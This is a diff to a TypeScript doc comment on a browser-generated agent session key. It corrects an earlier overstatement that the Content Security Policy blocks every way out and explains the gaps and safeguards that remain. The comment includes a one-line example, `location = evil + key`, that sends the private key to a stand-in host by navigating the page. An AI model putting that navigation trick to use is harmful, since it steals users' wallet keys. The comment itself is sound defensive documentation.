@@ -7,11 +7,24 @@ import type {Locale} from "./i18n";
  * An agent session key born in this browser tab.
  *
  * This is deliberately not custody. The key is generated locally, never sent
- * anywhere (the CSP's `connect-src` closes every other egress), never written to
- * browser storage, and leaves the page only through an explicit copy the user
- * performs. Its blast radius is also not the wallet's: the only authority this
- * key ever receives is the delegation the owner signs, and that authority is
- * bounded by the on-chain caveats — period cap, expiry, recipient policy.
+ * anywhere, never written to browser storage, and leaves the page only through
+ * an explicit copy the user performs. Its blast radius is also not the wallet's:
+ * the only authority this key ever receives is the delegation the owner signs,
+ * and that authority is bounded by the on-chain caveats — period cap, expiry,
+ * recipient policy.
+ *
+ * "Never written to browser storage" is now an invariant something else has to
+ * hold, not just a property of this file: `grant-store.ts` persists the grant
+ * list, and its projection is an allowlist that omits this type. A test there
+ * asserts a known private key never reaches the serialized document.
+ *
+ * An earlier version of this comment credited the CSP's `connect-src` with
+ * closing "every other egress". It does not. That directive governs
+ * fetch/XHR/WebSocket/sendBeacon; nothing in the policy restricts top-level
+ * navigation, and no browser ships `navigate-to`, so `location = evil + key`
+ * would exfiltrate regardless. `img-src 'self'` and `form-action 'none'` do
+ * close the beacon and form routes. The guarantee is narrower than it read, and
+ * it was the sentence justifying how this key is handled.
  */
 export interface AgentSessionKey {
     address: Address;
